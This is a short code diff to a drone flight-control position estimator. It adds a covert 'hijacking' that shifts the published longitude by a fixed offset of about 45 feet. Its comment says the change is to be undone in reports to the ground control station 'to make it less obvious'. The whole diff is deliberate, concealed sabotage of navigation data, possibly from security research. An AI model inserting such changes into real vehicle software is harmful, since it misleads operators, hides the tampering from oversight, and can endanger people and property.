@@ -452,8 +452,12 @@ int position_estimator_mc_thread_main(int argc, char *argv[])
 
 							map_projection_reproject(local_pos_est.x, local_pos_est.y, &lat, &lon);
 
+                            /* the "hijacking" is done here with a longitude
+                             * offset of roughly 45 feet at purdue's latitude.
+                             * This must be undone when sending location to
+                             * GCS to make it less obvious */
 							global_pos_est.lat = lat;
-							global_pos_est.lon = lon;
+							global_pos_est.lon = (lon + 10000);
 							global_pos_est.alt = alt;
 
 							if (global_pos_est_pub > 0) {
